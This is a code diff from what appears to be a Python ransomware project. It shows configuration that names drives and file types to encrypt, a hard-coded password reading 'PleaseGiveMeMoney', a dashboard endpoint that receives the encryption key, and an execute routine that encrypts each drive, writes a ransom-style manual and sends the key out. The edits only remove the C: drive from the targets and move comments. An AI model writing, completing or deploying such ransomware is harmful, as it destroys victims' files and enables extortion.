@@ -59,7 +59,7 @@ THANKS_PATH = resource_path("img/thank-you.png")
 ensure_time_dir_exists()
 
 # Encryption Configuration
-DRIVES_TO_ENCRYPT = ['F:', 'E:','D:','C:']
+DRIVES_TO_ENCRYPT = ['F:', 'E:','D:']
 EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
 PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
 DASHBOARD_URL = 'http://localhost/prjrans/includes/api/receive_key.php'
@@ -236,7 +236,7 @@ Your Security Team
         self.create_user_manual(drive)
         self.save_machine_id(drive)
 
-    # Step 16: Execute the encryption process
+ # Step 16: Execute the encryption process
     def execute(self):
         for drive in self.drives:
             logging.info(f"Processing drive {drive}")
@@ -245,6 +245,8 @@ Your Security Team
             logging.info("Encryption key saved locally.")
         else:
             logging.error("Failed to save encryption key locally.")
+        
+        # Add this code    
         if self.send_key_to_dashboard():
             logging.info("Encryption key sent successfully.")
         else:
